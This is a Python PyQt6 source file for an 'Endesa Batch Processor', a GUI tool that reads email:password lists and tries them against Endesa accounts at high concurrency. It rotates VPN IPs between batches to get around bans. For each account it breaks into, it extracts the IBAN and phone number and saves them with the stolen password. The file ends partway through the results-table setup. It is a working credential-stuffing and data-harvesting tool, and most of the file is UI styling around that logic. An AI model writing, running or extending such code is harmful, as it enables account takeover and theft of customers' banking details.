#!/usr/bin/env python3
"""Modern PyQt6 interface for Endesa batch processor."""

import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, QWidget, 
    QPushButton, QLabel, QSpinBox, QTextEdit, QProgressBar, 
    QGroupBox, QGridLayout, QFileDialog, QMessageBox, QTabWidget,
    QTableWidget, QTableWidgetItem, QHeaderView, QCheckBox
)
from PyQt6.QtCore import QThread, pyqtSignal, Qt, QTimer
from PyQt6.QtGui import QFont

from endesa import EndesaClient
from config import read_credentials
from vpn_manager import VPNManager


class BatchProcessorThread(QThread):
    """Thread for running batch processing without blocking the UI."""
    
    progress_updated = pyqtSignal(str)
    status_updated = pyqtSignal(str)
    stats_updated = pyqtSignal(int, int, int, int, float)  # success, failed, banned, total, rate
    progress_percentage = pyqtSignal(int)  # Progress percentage
    finished_processing = pyqtSignal(int, int, float)
    vpn_status_updated = pyqtSignal(str)  # VPN status updates
    
    def __init__(self, credentials_file: str, max_workers: int, output_file: str, max_retries: int = 3, retry_delay: float = 2.0, use_vpn: bool = False):
        super().__init__()
        self.credentials_file = credentials_file
        self.max_workers = max_workers
        self.output_file = output_file
        self.max_retries = max_retries
        self.retry_delay = retry_delay
        self.use_vpn = use_vpn
        self.vpn_manager = None
        self.running = True
        self.start_time = None
        
    def run(self):
        """Run the batch processing with proper threading and memory management."""
        try:
            # Check if credentials file exists
            if not os.path.exists(self.credentials_file):
                self.status_updated.emit("Credentials file not found")
                return
            
            # Read all credentials from the file
            with open(self.credentials_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            # Parse credentials (email:password format)
            credentials = []
            for line_num, line in enumerate(lines, 1):
                line = line.strip()
                if line and ':' in line:
                    email, password = line.split(':', 1)
                    credentials.append((email.strip(), password.strip(), line_num))
                elif line:  # Line exists but no colon - skip this line
                    self.progress_updated.emit(f"SKIP: Line {line_num} - Invalid format (missing ':')")
                    continue
            
            if not credentials:
                self.status_updated.emit("No valid credentials found in file")
                return
            
            total_credentials = len(credentials)
            self.status_updated.emit(f"Processing {total_credentials} credentials with {self.max_workers} workers...")
            
            self.start_time = time.time()
            successful = 0
            failed = 0
            banned = 0
            
            # Initialize VPN if enabled
            if self.use_vpn:
                try:
                    self.vpn_manager = VPNManager()
                    self.progress_updated.emit("VPN initialized successfully")
                    
                    # Connect to first VPN location before starting processing
                    self.progress_updated.emit("Connecting to initial VPN location...")
                    if self.vpn_manager.connect_smart():
                        # Verify initial connection
                        if self.vpn_manager._verify_connection():
                            initial_ip = self.vpn_manager.get_current_ip()
                            self.progress_updated.emit(f"Initial VPN connection established - IP: {initial_ip}")
                        else:
                            self.progress_updated.emit("Initial VPN connection verification failed, continuing without VPN")
                            self.use_vpn = False
                    else:
                        self.progress_updated.emit("Initial VPN connection failed, continuing without VPN")
                        self.use_vpn = False
                        
                except Exception as e:
                    self.progress_updated.emit(f"VPN initialization failed: {e}")
                    self.use_vpn = False
            
            # Process all credentials continuously without waiting for batch completion
            if self.use_vpn:
                # VPN mode: Process batch -> Wait completion -> Rotate IP -> Start next batch immediately
                remaining_credentials = credentials.copy()
                batch_count = 0
                
                while remaining_credentials and self.running:
                    # Take a batch of credentials (size = max_workers)
                    batch_size = min(self.max_workers, len(remaining_credentials))
                    current_batch = remaining_credentials[:batch_size]
                    remaining_credentials = remaining_credentials[batch_size:]
                    
                    batch_count += 1
                    self.progress_updated.emit(f"Processing batch {batch_count} of {batch_size} credentials...")
                    
                    # Process current batch and wait for completion
                    batch_results = self._process_batch(current_batch)
                    
                    # Update statistics
                    for result_type in batch_results:
                        if result_type == "SUCCESS":
                            successful += 1
                        elif result_type == "BANNED":
                            banned += 1
                        else:  # FAILED
                            failed += 1
                    
                    # Calculate progress
                    current_total = successful + failed + banned
                    progress_percent = int((current_total / total_credentials) * 100)
                    
                    # Update progress and statistics
                    self.progress_percentage.emit(progress_percent)
                    elapsed_time = time.time() - self.start_time
                    rate = current_total / elapsed_time if elapsed_time > 0 else 0
                    self.stats_updated.emit(successful, failed, banned, current_total, rate)
                    self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%)")
                    
                    # Rotate IP if there are more credentials to process
                    if remaining_credentials and self.running:
                        self.progress_updated.emit("Batch completed. Rotating IP...")
                        start_rotation = time.time()
                        
                        if self.vpn_manager.rotate_ip():
                            rotation_time = time.time() - start_rotation
                            self.progress_updated.emit(f"IP rotation completed in {rotation_time:.1f}s")
                        else:
                            self.progress_updated.emit("IP rotation failed, continuing with current IP")
            else:
                # Normal mode: Process all credentials continuously without waiting
                self.progress_updated.emit("Starting continuous processing (normal mode)...")
                
                # Use ThreadPoolExecutor for continuous processing
                with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                    # Submit all tasks to the thread pool
                    future_to_credential = {}
                    for email, password, line_num in credentials:
                        if not self.running:
                            break
                        
                        future = executor.submit(self._process_single_credential, email, password, line_num)
                        future_to_credential[future] = (email, line_num)
                    
                    # Process completed tasks immediately as they finish (non-blocking)
                    while future_to_credential and self.running:
                        # Check for completed futures without blocking
                        done_futures = []
                        for future in list(future_to_credential.keys()):
                            if future.done():
                                done_futures.append(future)
                        
                        # Process all completed futures immediately
                        for future in done_futures:
                            try:
                                result, result_type = future.result(timeout=0.1)  # Non-blocking
                                email, line_num = future_to_credential[future]
                                
                                # Write result immediately to file (write everything except login failures)
                                if not result.startswith("LOGIN_FAILED"):
                                    self._write_result_to_file(result)
                                
                                # Emit the actual result message first (for parsing)
                                self.progress_updated.emit(result)
                                
                                # Update statistics
                                if result_type == "SUCCESS":
                                    successful += 1
                                elif result_type == "BANNED":
                                    banned += 1
                                else:  # FAILED
                                    failed += 1
                                
                                # Calculate progress
                                current_total = successful + failed + banned
                                progress_percent = int((current_total / total_credentials) * 100)
                                
                                # Update progress and statistics
                                self.progress_percentage.emit(progress_percent)
                                elapsed_time = time.time() - self.start_time
                                rate = current_total / elapsed_time if elapsed_time > 0 else 0
                                self.stats_updated.emit(successful, failed, banned, current_total, rate)
                                self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%)")
                                
                                # Remove from tracking
                                del future_to_credential[future]
                                
                            except Exception as e:
                                email, line_num = future_to_credential[future]
                                result = f"ERROR: Line {line_num} - {email} - {str(e)}"
                                self._write_result_to_file(result)
                                self.progress_updated.emit(result)
                                
                                failed += 1
                                current_total = successful + failed + banned
                                progress_percent = int((current_total / total_credentials) * 100)
                                self.progress_percentage.emit(progress_percent)
                                elapsed_time = time.time() - self.start_time
                                rate = current_total / elapsed_time if elapsed_time > 0 else 0
                                self.stats_updated.emit(successful, failed, banned, current_total, rate)
                                self.status_updated.emit(f"Processed: {current_total}/{total_credentials} ({progress_percent}%)")
                                
                                # Remove from tracking
                                del future_to_credential[future]
                        
                        # Small sleep to prevent busy waiting
                        if not done_futures:
                            time.sleep(0.001)  # 1ms instead of blocking
            
            # Disconnect VPN if enabled
            if self.use_vpn and self.vpn_manager:
                try:
                    self.vpn_manager.disconnect()
                except Exception as e:
                    self.progress_updated.emit(f"VPN disconnect error: {e}")
            
            end_time = time.time()
            total_time = end_time - self.start_time
            
            self.finished_processing.emit(successful, failed, total_time)
            
        except Exception as e:
            self.status_updated.emit(f"Error: {str(e)}")
    
    def _process_batch(self, batch_credentials):
        """Process a batch of credentials using ThreadPoolExecutor."""
        results = []
        
        # Use ThreadPoolExecutor for true parallel processing
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submit all tasks to the thread pool
            future_to_credential = {}
            for email, password, line_num in batch_credentials:
                if not self.running:
                    break
                
                future = executor.submit(self._process_single_credential, email, password, line_num)
                future_to_credential[future] = (email, line_num)
            
            # Process completed tasks immediately as they finish (non-blocking)
            while future_to_credential:
                if not self.running:
                    break
                
                # Check for completed futures without blocking
                done_futures = []
                for future in list(future_to_credential.keys()):
                    if future.done():
                        done_futures.append(future)
                
                # Process all completed futures immediately
                for future in done_futures:
                    try:
                        result, result_type = future.result(timeout=0.1)  # Non-blocking
                        email, line_num = future_to_credential[future]
                        
                        # Write result immediately to file (write everything except login failures)
                        if not result.startswith("LOGIN_FAILED"):
                            self._write_result_to_file(result)
                        
                        # Emit the actual result message first (for parsing)
                        self.progress_updated.emit(result)
                        
                        # Then emit the progress message (but not for login failures to avoid duplicates)
                        if not result.startswith("LOGIN_FAILED"):
                            progress = f"Processed: {email} - {result}"
                            self.progress_updated.emit(progress)
                        
                        results.append(result_type)
                        
                        # Remove from tracking
                        del future_to_credential[future]
                        
                    except Exception as e:
                        email, line_num = future_to_credential[future]
                        result = f"ERROR: Line {line_num} - {email} - {str(e)}"
                        self._write_result_to_file(result)
                        
                        # Emit the actual result message first (for parsing)
                        self.progress_updated.emit(result)
                        
                        results.append("FAILED")
                        
                        # Remove from tracking
                        del future_to_credential[future]
                
                # Small sleep to prevent busy waiting
                if not done_futures:
                    time.sleep(0.001)  # 1ms instead of blocking
        
        return results
    
    def _process_single_credential(self, email: str, password: str, line_num: int):
        """Process a single credential - this runs in a separate thread."""
        try:
            # Create client with scaled connection pool and retry configuration
            client = EndesaClient(email, password, self.max_workers, self.max_retries, self.retry_delay)
            
            # Step 1: Try to login first with retry mechanism
            try:
                client.login()
                login_successful = True
            except Exception as login_error:
                login_successful = False
                error_msg = str(login_error)
                
                # Check for banned accounts (after all retries failed)
                if "BANNED:" in error_msg:
                    result = f"BANNED: Line {line_num} - {email} - {error_msg} (after {self.max_retries} retries)"
                    return result, "BANNED"
                # Check for specific login failures - don't write these to file
                elif "invalid username" in error_msg.lower() or "usuario o la contraseña son incorrectos" in error_msg.lower():
                    result = f"LOGIN_FAILED: Line {line_num} - {email} - Invalid credentials"
                    return result, "FAILED"  # Count as failed but don't write to file
                else:
                    result = f"LOGIN_FAILED: Line {line_num} - {email} - {error_msg}"
                    return result, "FAILED"  # Count as failed but don't write to file
            
            # Step 2: Only continue with data retrieval if login was successful
            if login_successful:
                try:
                    account_info = client.get_account_info()
                    
                    # Format result with password included
                    result = f"SUCCESS: Line {line_num} - {email}:{password} - IBAN: {account_info['iban']} Phone: {account_info['phone']}"
                    return result, "SUCCESS"
                    
                except Exception as data_error:
                    error_msg = str(data_error)
                    # Check for banned accounts during data retrieval (after all retries failed)
                    if "BANNED:" in error_msg:
                        result = f"BANNED: Line {line_num} - {email} - {error_msg} (after {self.max_retries} retries)"
                        return result, "BANNED"
                    else:
                        result = f"ERROR: Line {line_num} - {email} - Data retrieval failed: {error_msg}"
                        return result, "FAILED"
                        
        except Exception as e:
            result = f"ERROR: Line {line_num} - {email} - {str(e)}"
            return result, "FAILED"
        finally:
            # Always close the client to free connection pool resources
            if 'client' in locals():
                client.close()
    
    def _write_result_to_file(self, result: str):
        """Write a single result immediately to file."""
        try:
            with open(self.output_file, "a", encoding='utf-8') as f:
                f.write(result + "\n")
        except Exception as e:
            self.progress_updated.emit(f"ERROR: Failed to write to file - {str(e)}")
    
    def stop(self):
        """Stop the processing safely."""
        try:
            self.running = False
            # The thread will naturally exit when the while loop condition becomes false
        except Exception as e:
            # If anything goes wrong, just set running to False
            self.running = False


class EndesaInterface(QMainWindow):
    """Main interface window for Endesa batch processor."""
    
    def __init__(self):
        super().__init__()
        self.processor_thread: Optional[BatchProcessorThread] = None
        self.init_ui()
        
    def init_ui(self):
        """Initialize the user interface."""
        self.setWindowTitle("Endesa Batch Processor")
        self.setGeometry(100, 100, 1200, 900)  # Larger window for big datasets
        self.setMinimumSize(1000, 700)
        
        # Set modern dark theme styling
        self.setStyleSheet("""
            QMainWindow {
                background-color: #1e1e1e;
                color: #ffffff;
            }
            QWidget {
                background-color: #1e1e1e;
                color: #ffffff;
            }
            QGroupBox {
                font-weight: bold;
                border: 2px solid #404040;
                border-radius: 8px;
                margin-top: 1ex;
                padding-top: 10px;
                background-color: transparent;
                color: #ffffff;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #00b4d8;
            }
            QPushButton {
                background-color: #00b4d8;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 6px;
                font-weight: bold;
                font-size: 14px;
            }
            QPushButton:hover {
                background-color: #0096c7;
            }
            QPushButton:pressed {
                background-color: #0077b6;
            }
            QPushButton:disabled {
                background-color: #404040;
                color: #666666;
            }
            QSpinBox {
                padding: 8px;
                border: 2px solid #404040;
                border-radius: 6px;
                background-color: #1e1e1e;
                color: #ffffff;
                font-size: 14px;
            }
            QSpinBox:focus {
                border: 2px solid #00b4d8;
            }
            QSpinBox::up-button, QSpinBox::down-button {
                background-color: #404040;
                border: none;
                border-radius: 3px;
            }
            QSpinBox::up-button:hover, QSpinBox::down-button:hover {
                background-color: #00b4d8;
            }
            QTextEdit {
                border: 2px solid #404040;
                border-radius: 6px;
                background-color: #1e1e1e;
                color: #ffffff;
                font-family: 'Consolas', 'Monaco', monospace;
                font-size: 11px;
                padding: 8px;
            }
            QTextEdit:focus {
                border: 2px solid #00b4d8;
            }
            QProgressBar {
                border: 2px solid #404040;
                border-radius: 6px;
                text-align: center;
                background-color: #1e1e1e;
                color: #ffffff;
                font-weight: bold;
                height: 25px;
            }
            QProgressBar::chunk {
                background-color: #00b4d8;
                border-radius: 4px;
            }
            QLabel {
                color: #ffffff;
                font-size: 14px;
            }
            QLineEdit {
                padding: 8px;
                border: 2px solid #404040;
                border-radius: 6px;
                background-color: #1e1e1e;
                color: #ffffff;
                font-size: 14px;
            }
            QLineEdit:focus {
                border: 2px solid #00b4d8;
            }
            QLineEdit:read-only {
                background-color: #1e1e1e;
                color: #888888;
            }
        """)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        layout = QVBoxLayout(central_widget)
        layout.setSpacing(15)
        layout.setContentsMargins(20, 20, 20, 20)
        
        # Title
        title_label = QLabel("Endesa Batch Processor")
        title_label.setFont(QFont("Arial", 24, QFont.Weight.Bold))
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title_label.setStyleSheet("color: #00b4d8; margin-bottom: 10px; font-size: 24px;")
        layout.addWidget(title_label)
        
        # Configuration group - Clean and simple
        config_group = QGroupBox("⚙️ Configuration")
        config_group.setStyleSheet("""
            QGroupBox {
                border: 1px solid #404040;
                border-radius: 8px;
                margin-top: 1ex;
                padding-top: 15px;
                background-color: transparent;
                color: #ffffff;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 8px 0 8px;
                color: #00b4d8;
                font-size: 14px;
                font-weight: bold;
            }
        """)
        config_layout = QGridLayout(config_group)
        config_layout.setSpacing(15)
        config_layout.setContentsMargins(20, 20, 20, 20)
        
        # Credentials file selection - Row 0
        self.credentials_label = QLabel("📁 Credentials File:")
        self.credentials_label.setStyleSheet("color: #ffffff; font-size: 13px; font-weight: bold;")
        
        self.credentials_path_label = QLabel("No file selected")
        self.credentials_path_label.setStyleSheet("""
            color: #888888; 
            font-style: italic; 
            padding: 8px 12px; 
            border: 1px solid #505050; 
            border-radius: 4px; 
            background-color: #1e1e1e;
            font-size: 11px;
        """)
        
        self.browse_button = QPushButton("Browse")
        self.browse_button.setMinimumWidth(80)
        self.browse_button.setMinimumHeight(32)
        self.browse_button.clicked.connect(self.browse_credentials_directory)
        self.browse_button.setStyleSheet("""
            QPushButton {
                background-color: #00b4d8;
                color: white;
                border: none;
                padding: 8px 15px;
                border-radius: 4px;
                font-weight: bold;
                font-size: 11px;
            }
            QPushButton:hover {
                background-color: #0096c7;
            }
            QPushButton:pressed {
                background-color: #0077b6;
            }
        """)
        
        config_layout.addWidget(self.credentials_label, 0, 0)
        config_layout.addWidget(self.credentials_path_label, 0, 1)
        config_layout.addWidget(self.browse_button, 0, 2)
        
        # Thread count selection - Row 1
        self.threads_label = QLabel("⚡ Thread Count:")
        self.threads_label.setStyleSheet("color: #ffffff; font-size: 13px; font-weight: bold;")
        
        self.threads_spinbox = QSpinBox()
        self.threads_spinbox.setRange(1, 200)
        self.threads_spinbox.setValue(50)
        self.threads_spinbox.setMinimumWidth(100)
        self.threads_spinbox.setMinimumHeight(32)
        self.threads_spinbox.setStyleSheet("""
            QSpinBox {
                padding: 6px 10px;
                border: 1px solid #505050;
                border-radius: 4px;
                background-color: #1e1e1e;
                color: #ffffff;
                font-size: 11px;
            }
            QSpinBox:focus {
                border: 1px solid #00b4d8;
            }
            QSpinBox::up-button, QSpinBox::down-button {
                background-color: #404040;
                border: none;
                border-radius: 2px;
                width: 16px;
                height: 12px;
                margin: 1px;
            }
            QSpinBox::up-button:hover, QSpinBox::down-button:hover {
                background-color: #00b4d8;
            }
        """)
        
        config_layout.addWidget(self.threads_label, 1, 0)
        config_layout.addWidget(self.threads_spinbox, 1, 1)
        
        # Retry configuration - Row 2
        self.retry_label = QLabel("🔄 Retry Settings:")
        self.retry_label.setStyleSheet("color: #ffffff; font-size: 13px; font-weight: bold;")
        
        retry_container = QWidget()
        retry_layout = QHBoxLayout(retry_container)
        retry_layout.setSpacing(15)
        retry_layout.setContentsMargins(0, 0, 0, 0)
        
        # Max retries
        retry_attempts_label = QLabel("Max Retries:")
        retry_attempts_label.setStyleSheet("color: #888888; font-size: 11px;")
        
        self.retry_attempts_spinbox = QSpinBox()
        self.retry_attempts_spinbox.setRange(1, 10)
        self.retry_attempts_spinbox.setValue(3)
        self.retry_attempts_spinbox.setMinimumWidth(80)
        self.retry_attempts_spinbox.setMinimumHeight(32)
        self.retry_attempts_spinbox.setStyleSheet("""
            QSpinBox {
                padding: 6px 10px;
                border: 1px solid #505050;
                border-radius: 4px;
                background-color: #1e1e1e;
                color: #ffffff;
                font-size: 11px;
            }
            QSpinBox:focus {
                border: 1px solid #00b4d8;
            }
            QSpinBox::up-button, QSpinBox::down-button {
                background-color: #404040;
                border: none;
                border-radius: 2px;
                width: 16px;
                height: 12px;
                margin: 1px;
            }
            QSpinBox::up-button:hover, QSpinBox::down-button:hover {
                background-color: #00b4d8;
            }
        """)
        
        # Base delay
        retry_delay_label = QLabel("Base Delay (s):")
        retry_delay_label.setStyleSheet("color: #888888; font-size: 11px;")
        
        self.retry_delay_spinbox = QSpinBox()
        self.retry_delay_spinbox.setRange(1, 30)
        self.retry_delay_spinbox.setValue(2)
        self.retry_delay_spinbox.setMinimumWidth(80)
        self.retry_delay_spinbox.setMinimumHeight(32)
        self.retry_delay_spinbox.setStyleSheet("""
            QSpinBox {
                padding: 6px 10px;
                border: 1px solid #505050;
                border-radius: 4px;
                background-color: #1e1e1e;
                color: #ffffff;
                font-size: 11px;
            }
            QSpinBox:focus {
                border: 1px solid #00b4d8;
            }
            QSpinBox::up-button, QSpinBox::down-button {
                background-color: #404040;
                border: none;
                border-radius: 2px;
                width: 16px;
                height: 12px;
                margin: 1px;
            }
            QSpinBox::up-button:hover, QSpinBox::down-button:hover {
                background-color: #00b4d8;
            }
        """)
        
        retry_layout.addWidget(retry_attempts_label)
        retry_layout.addWidget(self.retry_attempts_spinbox)
        retry_layout.addWidget(retry_delay_label)
        retry_layout.addWidget(self.retry_delay_spinbox)
        retry_layout.addStretch()
        
        config_layout.addWidget(self.retry_label, 2, 0)
        config_layout.addWidget(retry_container, 2, 1, 1, 2)
        
        # VPN checkbox - Row 3
        self.vpn_label = QLabel("🌐 VPN:")
        self.vpn_label.setStyleSheet("color: #ffffff; font-size: 13px; font-weight: bold;")
        
        # Create a container for VPN with better visual feedback
        vpn_container = QWidget()
        vpn_layout = QHBoxLayout(vpn_container)
        vpn_layout.setSpacing(10)
        vpn_layout.setContentsMargins(0, 0, 0, 0)
        
        self.vpn_checkbox = QCheckBox("Enable IP rotation between batches")
        self.vpn_checkbox.setChecked(False)
        self.vpn_checkbox.setStyleSheet("""
            QCheckBox {
                color: #ffffff;
                font-size: 11px;
            }
            QCheckBox::indicator {
                width: 20px;
                height: 20px;
                border: 2px solid #505050;
                border-radius: 5px;
                background-color: #1e1e1e;
            }
            QCheckBox::indicator:checked {
                background-color: #00b4d8;
                border: 2px solid #00b4d8;
            }
            QCheckBox::indicator:unchecked {
                background-color: #1e1e1e;
                border: 2px solid #505050;
            }
            QCheckBox::indicator:hover {
                background-color: #404040;
                border: 2px solid #00b4d8;
            }
            QCheckBox:checked {
                color: #00b4d8;
                font-weight: bold;
            }
        """)
        
        # Add a status indicator label
        self.vpn_status_indicator = QLabel("❌ Disabled")
        self.vpn_status_indicator.setStyleSheet("""
            color: #ff6b6b;
            font-size: 10px;
            font-weight: bold;
            padding: 4px 8px;
            border: 1px solid #ff6b6b;
            border-radius: 3px;
            background-color: rgba(255, 107, 107, 0.1);
        """)
        
        # Connect checkbox to update status indicator
        self.vpn_checkbox.toggled.connect(self.update_vpn_status_indicator)
        
        vpn_layout.addWidget(self.vpn_checkbox)
        vpn_layout.addWidget(self.vpn_status_indicator)
        vpn_layout.addStretch()
        
        config_layout.addWidget(self.vpn_label, 3, 0)
        config_layout.addWidget(vpn_container, 3, 1, 1, 2)
        
        layout.addWidget(config_group)
        
        # Control group
        control_group = QGroupBox("Controls")
        control_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #404040;
                border-radius: 8px;
                margin-top: 1ex;
                padding-top: 10px;
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #2d2d2d, stop:1 #1e1e1e);
                color: #ffffff;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 8px 0 8px;
                color: #00b4d8;
                font-size: 14px;
                font-weight: bold;
            }
        """)
        control_layout = QHBoxLayout(control_group)
        control_layout.setSpacing(15)
        control_layout.setContentsMargins(15, 15, 15, 15)
        
        # Control buttons container
        control_buttons = QWidget()
        control_buttons.setStyleSheet("""
            QWidget {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #3a3a3a, stop:1 #2a2a2a);
                border: 1px solid #505050;
                border-radius: 6px;
                padding: 12px;
            }
        """)
        control_buttons_layout = QHBoxLayout(control_buttons)
        control_buttons_layout.setSpacing(15)
        control_buttons_layout.setContentsMargins(12, 12, 12, 12)
        
        self.start_button = QPushButton("▶ Start Processing")
        self.start_button.clicked.connect(self.start_processing)
        self.start_button.setMinimumHeight(45)
        self.start_button.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #28a745, stop:1 #20c997);
                color: white;
                border: none;
                padding: 12px 25px;
                border-radius: 8px;
                font-weight: bold;
                font-size: 14px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #20c997, stop:1 #17a2b8);
            }
            QPushButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #17a2b8, stop:1 #138496);
            }
            QPushButton:disabled {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #404040, stop:1 #2a2a2a);
                color: #666666;
            }
        """)
        
        self.stop_button = QPushButton("⏹ Stop Processing")
        self.stop_button.clicked.connect(self.stop_processing)
        self.stop_button.setEnabled(False)
        self.stop_button.setMinimumHeight(45)
        self.stop_button.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #dc3545, stop:1 #c82333);
                color: white;
                border: none;
                padding: 12px 25px;
                border-radius: 8px;
                font-weight: bold;
                font-size: 14px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #c82333, stop:1 #bd2130);
            }
            QPushButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #bd2130, stop:1 #a71e2a);
            }
            QPushButton:disabled {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #404040, stop:1 #2a2a2a);
                color: #666666;
            }
        """)
        
        control_buttons_layout.addWidget(self.start_button)
        control_buttons_layout.addWidget(self.stop_button)
        
        control_layout.addWidget(control_buttons)
        
        layout.addWidget(control_group)
        
        # Progress group
        progress_group = QGroupBox("Progress & Statistics")
        progress_layout = QVBoxLayout(progress_group)
        progress_layout.setSpacing(10)
        
        # Status and progress
        self.status_label = QLabel("Ready to start")
        self.status_label.setStyleSheet("color: #888888; font-size: 14px; padding: 5px;")
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        
        # Statistics panel
        stats_layout = QHBoxLayout()
        
        # Success counter
        self.success_label = QLabel("Success: 0")
        self.success_label.setStyleSheet("color: #00ff00; font-size: 16px; font-weight: bold; padding: 10px; border: 2px solid #00ff00; border-radius: 6px; background-color: #1e1e1e;")
        
        # Failure counter
        self.failure_label = QLabel("Failed: 0")
        self.failure_label.setStyleSheet("color: #ff4444; font-size: 16px; font-weight: bold; padding: 10px; border: 2px solid #ff4444; border-radius: 6px; background-color: #1e1e1e;")
        
        # Banned counter
        self.banned_label = QLabel("Banned: 0")
        self.banned_label.setStyleSheet("color: #ff8800; font-size: 16px; font-weight: bold; padding: 10px; border: 2px solid #ff8800; border-radius: 6px; background-color: #1e1e1e;")
        
        # Total counter
        self.total_label = QLabel("Total: 0")
        self.total_label.setStyleSheet("color: #00b4d8; font-size: 16px; font-weight: bold; padding: 10px; border: 2px solid #00b4d8; border-radius: 6px; background-color: #1e1e1e;")
        
        # Rate counter
        self.rate_label = QLabel("Rate: 0 req/s")
        self.rate_label.setStyleSheet("color: #ffffff; font-size: 14px; font-weight: bold; padding: 10px; border: 2px solid #404040; border-radius: 6px; background-color: #2d2d2d;")
        
        stats_layout.addWidget(self.success_label)
        stats_layout.addWidget(self.failure_label)
        stats_layout.addWidget(self.banned_label)
        stats_layout.addWidget(self.total_label)
        stats_layout.addWidget(self.rate_label)
        
        progress_layout.addWidget(self.status_label)
        progress_layout.addWidget(self.progress_bar)
        progress_layout.addLayout(stats_layout)
        
        layout.addWidget(progress_group)
        
        # Output group with tabbed interface
        output_group = QGroupBox("Results")
        output_layout = QVBoxLayout(output_group)
        
        # Create tab widget
        self.tab_widget = QTabWidget()
        self.tab_widget.setStyleSheet("""
            QTabWidget::pane {
                border: 2px solid #404040;
                border-radius: 6px;
                background-color: #2d2d2d;
            }
            QTabBar::tab {
                background-color: #404040;
                color: #ffffff;
                padding: 10px 20px;
                margin-right: 2px;
                border-top-left-radius: 6px;
                border-top-right-radius: 6px;
                font-weight: bold;
            }
            QTabBar::tab:selected {
                background-color: #00b4d8;
                color: #ffffff;
            }
            QTabBar::tab:hover {
                background-color: #505050;
            }
        """)
        
        # Output Log Tab
        output_tab = QWidget()
        output_tab_layout = QVBoxLayout(output_tab)
        
        # Output controls
        output_controls_layout = QHBoxLayout()
        
        self.clear_output_button = QPushButton("Clear Output")
        self.clear_output_button.clicked.connect(self.clear_output)
        self.clear_output_button.setStyleSheet("""
            QPushButton {
                background-color: #6c757d;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 4px;
                font-weight: bold;
                font-size: 12px;
            }
            QPushButton:hover {
                background-color: #5a6268;
            }
        """)
        
        self.output_info_label = QLabel("Output will auto-scroll and show last 1000 lines for performance")
        self.output_info_label.setStyleSheet("color: #888888; font-size: 11px; font-style: italic;")
        
        output_controls_layout.addWidget(self.clear_output_button)
        output_controls_layout.addStretch()
        output_controls_layout.addWidget(self.output_info_label)
        
        output_tab_layout.addLayout(output_controls_layout)
        
        # Output text area
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setMinimumHeight(300)
        self.output_text.setStyleSheet("""
            QTextEdit {
                border: 2px solid #404040;
                border-radius: 6px;
                background-color: #1e1e1e;
                color: #ffffff;
                font-family: 'Consolas', 'Monaco', monospace;
                font-size: 11px;
                padding: 10px;
            }
        """)
        self.output_text.setAcceptRichText(True)
        
        # Initialize output management
        self.output_lines = []
        self.max_output_lines = 1000
        
        output_tab_layout.addWidget(self.output_text)
        
        # Success Table Tab
        table_tab = QWidget()
        table_tab_layout = QVBoxLayout(table_tab)
        
        # Table controls
        table_controls_layout = QHBoxLayout()
        
        self.clear_table_button = QPushButton("Clear Table")
        self.clear_table_button.clicked.connect(self.clear_success_table)
        self.clear_table_button.setStyleSheet("""
            QPushButton {
                background-color: #6c757d;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 4px;
                font-weight: bold;
                font-size: 12px;
            }
            QPushButton:hover {
                background-color: #5a6268;
            }
        """)
        
        self.table_info_label = QLabel("Shows only successful results with credentials and IBAN")
        self.table_info_label.setStyleSheet("color: #888888; font-size: 11px; font-style: italic;")
        
        table_controls_layout.addWidget(self.clear_table_button)
        table_controls_layout.addStretch()
        table_controls_layout.addWidget(self.table_info_label)
        
        table_tab_layout.addLayout(table_controls_layout)
        
        # Success table
        self.success_table = QTableWidget()
        self.success_table.setColumnCount(5)
        self.success_table.setHorizontalHeaderLabels(["Line", "Email", "Password", "IBAN", "Phone"])
        self.success_table.setStyleSheet("""
            QTableWidget {
                border: 2px solid #404040;
                border-radius: 6px;
                background-color: #1e1e1e;
                color: #ffffff;
                gridline-color: #404040;
                font-size: 11px;
            }
            QTableWidget::item {
                padding: 8px;
                border-bottom: 1px solid #404040;
            }
            QTableWidget::item:selected {
                background-color: #00b4d8;
                color: #ffffff;
            }
            QHeaderView::section {
                background-color: #2d2d2d;
                color: #ffffff;
                padding: 10px;
                border: none;
                border-bottom: 2px solid #404040;
                font-weight: bold;
            }
            QHeaderView::section:hover {
                background-color: #404040;
            }
        """)
        
        # Set table properties
        header = self.success_table.horizontalHeader()
        header.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)  # Line
        header.setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)  # Email
